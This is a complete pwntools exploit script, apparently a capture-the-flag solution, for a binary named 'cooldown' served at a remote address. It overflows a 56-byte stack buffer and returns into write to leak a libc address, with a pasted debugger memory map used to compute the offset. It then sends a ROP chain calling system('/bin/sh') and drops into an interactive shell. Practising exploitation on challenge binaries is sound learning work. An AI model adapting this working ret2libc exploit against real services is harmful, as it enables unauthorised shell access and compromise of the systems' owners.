#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./cooldown', checksec=False)

if args.REMOTE:
	p = remote('141.164.48.191', 10005)
	libc = ELF('./libc.so.6', checksec=False)
else:
	s = process('socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./cooldown,pty,setsid,sigint,sane,rawer'.split())
	p = remote('127.0.0.1', 9999)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

payload  = b''    
payload += 56 * b'A'
payload += p64(binary.plt.write)

p.sendafter(b'> ',payload)
p.recv(len(payload))

'''
0x00007fffffffe448│+0x0040: 0x00007ffff7dd40ca  →  <_dl_start_user+50> lea rdx, [rip+0xfa6f]        # 0x7ffff7de3b40 <_dl_fini>

0x00007ffff79e2000 0x00007ffff7bc9000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd3000 0x0000000000000000 rw-
0x00007ffff7dd3000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
'''

libc.address = u64(p.recv(8)) - (0x00007ffff7dd40ca - 0x00007ffff79e2000)
log.info('libc.address: {x}'.format(x = hex(libc.address)))

pop_rdi = libc.search(asm('pop rdi; ret')).__next__()

payload  = b''
payload += 56 * b'A'
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

assert(len(payload) <= 0x60)

p.sendafter(b'> ',payload)
p.interactive()

